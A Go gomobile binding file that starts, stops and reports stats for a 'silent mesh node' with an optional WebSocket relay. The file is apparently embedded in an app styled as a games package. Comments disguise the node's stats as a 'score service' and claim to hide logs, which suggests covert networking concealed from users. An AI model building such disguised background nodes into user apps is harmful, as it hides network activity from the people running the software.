// Mobile bindings for gomobile.
// Exposed to Kotlin as com.pixelclassics.core.Core
package core

import (
	"encoding/json"
	"log"
	"os"
)

var node *Cargo

// StartNode initializes and starts the silent mesh node.
// dataDir: app's internal files directory (Context.getFilesDir())
// relayURL: WebSocket relay URL (empty string to skip)
func StartNode(dataDir, relayURL string) string {
	if node != nil && node.running {
		return `{"status":"already_running"}`
	}

	// Suppress logs to avoid leaking info
	log.SetOutput(os.Stderr)

	cfg := Config{
		DataDir:  dataDir + "/cargo",
		RelayURL: relayURL,
		MeshPort: 0,
	}

	var err error
	node, err = New(cfg)
	if err != nil {
		return `{"status":"error","msg":"` + err.Error() + `"}`
	}

	if err := node.Start(); err != nil {
		return `{"status":"error","msg":"` + err.Error() + `"}`
	}

	return `{"status":"ok"}`
}

// StopNode shuts down the mesh node.
func StopNode() {
	if node != nil {
		node.Stop()
	}
}

// GetStats returns JSON stats for the "score service."
func GetStats() string {
	if node == nil {
		return `{"running":false}`
	}
	data, _ := json.Marshal(node.Stats())
	return string(data)
}
